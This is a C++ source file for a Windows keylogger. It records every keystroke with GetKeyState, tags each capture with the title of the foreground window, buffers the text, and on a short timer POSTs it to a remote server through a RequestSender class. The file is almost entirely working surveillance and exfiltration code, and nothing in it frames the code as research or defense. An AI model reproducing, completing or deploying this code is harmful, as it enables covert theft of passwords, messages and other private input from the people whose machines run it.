#include "KeyLogger.h"
/*
The below allows us to access data on keypressesand windows
ran into problems including winuser.h directly due to winnt.h
https://stackoverflow.com/questions/257134/weird-compile-error-dealing-with-winnt-h
*/

// if the macro doesn't exist yet, include wtypes.h

// for implementing a 5 minute timer very simply
#include <ctime>
#include <stdlib.h>

// a globally accessible string variable to store output to
// for use by dataToOut
extern std::string outputtedData = "";
// start time
extern time_t currTime = time(0);
// start time + 5 mins
extern time_t endTime = currTime + 10;

std::string KeyLogger::returnForegroundWindow(HWND newWin)
{
	/*
	Retrieves the name of the window the user is typing into
	*/
	char winName[301];
	GetWindowTextA(newWin, winName, 301);
	return "\n"+(std::string)winName+"\n";
}

void KeyLogger::dataToOut(std::string dataToSend)
{
	/*
	Called whenever data needs to be outputted
	Starting with a basic text file to begin with but will eventually output data straight through connection
		a web server may be the easiest way to do this

	1. output passed in data to out variable
	2. check if start time + 5 minutes = current time
		a. if true, call dataToServer
		b. else do nothing
	*/
	outputtedData += dataToSend;
	currTime = time(0);
	if (endTime <= currTime) 
	{
		// reset values of endTime and currTime
		endTime = currTime + 10;
		// call dataToServer
		dataToServer(outputtedData);
	}
}

void KeyLogger::dataToServer(std::string dataToSend)
{
	/*
	responsible for sending data to remote server
	This will be done through a web request
	https://docs.microsoft.com/en-us/windows/win32/winhttp/winhttp-sessions-overview

	https://stackoverflow.com/questions/38672719/post-request-in-winhttp-c
	make post request
	*/
	RequestSender rSender = RequestSender();
	// converting std string to char*
	outputtedData += '\r\n';
	std::vector<char> outputToCharArr(outputtedData.c_str(), outputtedData.c_str() + outputtedData.size() + 1);
	int outputSize = outputToCharArr.size();
	// passes the memory address of the first char of output
	rSender.sendDataAcross(&outputToCharArr[0], outputSize);
	// clear outputted data after sending
	outputtedData = "";
}

std::string KeyLogger::returnChar(char c) 
{
	bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) ? true : false;
	switch (c)
	{
	case VK_CAPITAL:
		return "!caps!";
	case VK_SPACE:
		return "!space!";
	case VK_BACK:
		return "!backsp!";
	case VK_RETURN:
		return "!enter!";
	case -69:
		if (shiftPressed)
			return "!shift++!";
		return "+";
	case -36:
		if (shiftPressed)
			return "!shift+\\!";
		return "\\";
	case VK_SUBTRACT:
		if (shiftPressed)
			return "!shift+-!";
		return "-";
	case -66:
		if (shiftPressed)
			return "!shift+.!";
		return ".";
	case -65:
		if (shiftPressed)
			return "!shift+/!";
		return "/";
	case -70:
		if (shiftPressed)
			return  "!shift+;!";
		return ";";
	case -64:
		if (shiftPressed)
			return "!shift+'!";
		return "'";
	case -37:
		if (shiftPressed)
			return "!shift+[!";
		return "[";
	case -35:
		if (shiftPressed)
			return "!shift+]!";
		return "]";
	case -67:
		if (shiftPressed)
			return "!shift+-!";
		return "-";
	case -68:
		if (shiftPressed)
			return "!shift+,!";
		return ",";
	default:
		int cAsInt = (int)c;
		std::string ch(1, c);
		// a temporary solution to the shift key not being captured- i dont like it but getkeystate is delayed
		if (cAsInt == -96 || cAsInt == -95) 
		{ 
			return "!shift_or_accented_a!";
		}
		if (shiftPressed) 
		{
			if (std::isalpha(ch[0]) > 0) 
			{
				// return character as is- capital
				return ch;
			}
			return "!shift+"+ch+"!";
			// i could have also returned the character entered when pressing shift with digits; this is different from us to uk
		}
		// return lower case of character otherwise
		ch = tolower(c);
		return ch;
	}
}